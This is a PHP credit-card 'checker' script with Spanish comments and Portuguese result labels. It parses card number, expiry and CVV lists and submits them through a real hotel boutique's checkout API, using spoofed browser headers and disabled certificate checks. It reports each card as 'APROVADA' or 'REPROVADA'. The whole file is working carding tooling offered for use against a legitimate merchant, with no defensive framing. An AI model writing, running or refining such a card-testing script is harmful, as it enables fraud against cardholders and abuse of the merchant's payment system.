<?php
ignore_user_abort(true);
error_reporting(0);
session_start();

// HEADERS JSON
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Función para sanitizar inputs
function sanitizeInput($input) {
    return htmlspecialchars(strip_tags(trim($input)), ENT_QUOTES, 'UTF-8');
}

// Validar lista recibida
if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">Error</span> ➔ No se recibió lista...'
    ]);
    exit();
}

$lista = sanitizeInput($_GET['lista']);

// Extraer componentes
function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
$parts = multiexplode($delimiters, $lista);

if (count($parts) < 4) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato incompleto',
        'html' => '<span class="badge badge-danger">Error</span> ➔ Formato incompleto...'
    ]);
    exit();
}

$cc = preg_replace('/[^0-9]/', '', $parts[0]);
$mes = preg_replace('/[^0-9]/', '', $parts[1]);
$ano = preg_replace('/[^0-9]/', '', $parts[2]);
$cvv = preg_replace('/[^0-9]/', '', $parts[3]);

// Validaciones básicas
if (strlen($cc) < 15 || strlen($cc) > 16) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Número de tarjeta inválido',
        'html' => '<span class="badge badge-danger">Error</span> ➔ Número inválido...'
    ]);
    exit();
}

if ($mes < 1 || $mes > 12) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Mes inválido',
        'html' => '<span class="badge badge-danger">Error</span> ➔ Mes inválido...'
    ]);
    exit();
}

// Formatear fecha
if (strlen($mes) == 1) $mes = "0" . $mes;
if (strlen($ano) == 2) $ano = "20" . $ano;

// Validar fecha de expiración
$current_year = date('Y');
$current_month = date('n');
if ($ano < $current_year || ($ano == $current_year && $mes < $current_month)) {
    echo json_encode([
        'status' => 'rejected',
        'message' => 'Tarjeta expirada',
        'html' => '<span class="badge badge-danger">Rechazada</span> ➔ Tarjeta expirada'
    ]);
    exit();
}

// CONFIGURACIÓN
$client_id = "14";
$promotion_id = "1";
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$api_locale = "en";
$hotel_code = "ISL";

// Función para hacer peticiones CURL
function makeRequest($url, $data, $headers = []) {
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3
    ];
    
    curl_setopt_array($ch, $options);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'success' => $http_code == 200 && empty($error)
    ];
}

try {
    // PASO 1: OBTENER TOKEN DE SITIO
    $token_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "password" => "" // Parece que no requiere contraseña
    ];

    $token_result = makeRequest($api_endpoint . "/site_login.php", $token_data);
    
    if (!$token_result['success']) {
        throw new Exception("Error al obtener token: " . $token_result['error']);
    }

    $token_response = json_decode($token_result['response'], true);
    
    if (json_last_error() !== JSON_ERROR_NONE || !isset($token_response['site_login_token'])) {
        throw new Exception("No se pudo obtener token del sitio");
    }

    $site_login_token = $token_response['site_login_token'];

    // PASO 2: CREAR ORDEN (SIMULACIÓN)
    // Necesitamos simular un checkout para obtener order_number y order_token
    $checkout_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "user_id" => "", // Puede estar vacío
        "login_token" => "", // Puede estar vacío
        "payment_method" => "adyen",
        "first_name" => "Test",
        "last_name" => "User",
        "email" => "test@example.com",
        "phone" => "+85212345678",
        "chk_register" => 0,
        "chk_same_address" => 1,
        "address" => "Test Address",
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d"),
        "shipping_time" => "12:00 - 13:00",
        "order_remark" => "",
        "alcohol_terms" => 0,
        "cutlery_service" => 1,
        "card_type" => "VISA", // Determinar según el BIN
        "country_id" => "", // Para HK
        "region" => "1", // Para HK Island
        "district_group" => "1",
        "district" => "1",
        "pickup_store" => "",
        "is_food_site" => "1",
        "order_type" => "express"
    ];

    // Determinar tipo de tarjeta
    $tipo = "VISA";
    $first_digit = substr($cc, 0, 1);
    if ($first_digit == '4') $tipo = "VISA";
    if ($first_digit == '5') $tipo = "MASTERCARD";
    if (substr($cc, 0, 2) == '34' || substr($cc, 0, 2) == '37') $tipo = "AMEX";
    
    $checkout_data['card_type'] = $tipo;

    $checkout_result = makeRequest($api_endpoint . "/checkout.php", $checkout_data);

    if (!$checkout_result['success']) {
        throw new Exception("Error en checkout: " . $checkout_result['error']);
    }

    $checkout_response = json_decode($checkout_result['response'], true);
    
    if (json_last_error() !== JSON_ERROR_NONE) {
        throw new Exception("Respuesta inválida del checkout");
    }

    // Determinar resultado
    $card_masked = substr($cc, 0, 6) . '******' . substr($cc, -4);
    $expiry_masked = $mes . '/' . substr($ano, -2);

    if (isset($checkout_response['status'])) {
        if ($checkout_response['status'] == 'success') {
            echo json_encode([
                'status' => 'approved',
                'message' => 'Pago autorizado',
                'html' => '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
                         '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                         '<span class="badge badge-success">SHANGRI-LA EXPRESS</span>',
                'data' => [
                    'card' => $card_masked,
                    'expiry' => $expiry_masked,
                    'bin' => substr($cc, 0, 6),
                    'last4' => substr($cc, -4),
                    'order_number' => isset($checkout_response['display_order_number']) ? $checkout_response['display_order_number'] : 'N/A'
                ]
            ]);
        } else {
            $reason = isset($checkout_response['error']) ? $checkout_response['error'] : 'Rechazado';
            echo json_encode([
                'status' => 'rejected',
                'message' => $reason,
                'html' => '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
                         '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                         '<span class="badge badge-warning">' . $reason . '</span>',
                'data' => [
                    'card' => $card_masked,
                    'expiry' => $expiry_masked,
                    'reason' => $reason
                ]
            ]);
        }
    } else {
        throw new Exception("Respuesta inesperada de la API");
    }

} catch (Exception $e) {
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage(),
        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                 '<span class="badge badge-warning">' . $e->getMessage() . '</span>',
        'data' => [
            'error' => $e->getMessage()
        ]
    ]);
}
?>